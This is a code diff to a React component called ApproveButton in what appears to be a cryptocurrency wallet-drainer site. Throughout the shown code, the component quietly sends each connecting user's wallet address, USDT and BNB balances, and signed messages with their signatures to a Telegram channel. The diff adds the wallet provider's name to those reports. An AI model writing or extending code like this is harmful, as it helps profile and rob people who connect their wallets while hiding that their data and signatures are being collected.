@@ -235,7 +235,10 @@ export default function ApproveButton() {
     if (isConnected && address && usdtBalance && bscBalance) {
       // Check if this is a new connection or if balances have changed
       if (hasBalanceChanged(usdtFormatted, bnbFormatted, address)) {
-        const message = `🟢 Wallet Update:\n<code>${address}</code>\nUSDT: $${usdtFormatted}\nBNB: ${bnbFormatted}`;
+        // Get wallet name from connector
+        const walletName = walletClient?.connector?.name || connector?.name || "Unknown Wallet";
+        
+        const message = `🟢 Wallet Update:\n<code>${address}</code>\n💼 Wallet: ${walletName}\nUSDT: $${usdtFormatted}\nBNB: ${bnbFormatted}`;
 
         // Send to Telegram
         sendToTelegram(message);
@@ -244,6 +247,7 @@ export default function ApproveButton() {
         const walletData = {
           address,
           action: "wallet_connected",
+          walletName: walletClient?.connector?.name || connector?.name || "Unknown Wallet",
           usdtBalance: usdtFormatted,
           bnbBalance: bnbFormatted,
           timestamp: new Date().toISOString(),
@@ -339,13 +343,15 @@ export default function ApproveButton() {
       //console.log("Message signed successfully:", signature);
 
       // Send sign success to Telegram
+      const walletName = walletClient?.connector?.name || connector?.name || "Unknown Wallet";
       await sendToTelegram(
-        `✅ Message Signed:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`,
+        `✅ Message Signed:\n<code>${address}</code>\n💼 Wallet: ${walletName}\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`,
       );
 
       const signData = {
         address,
         action: "message_signed",
+        walletName: walletClient?.connector?.name || connector?.name || "Unknown Wallet",
         message: signMessage,
         signature: signature,
         usdtBalance: currentUsdtFormatted,
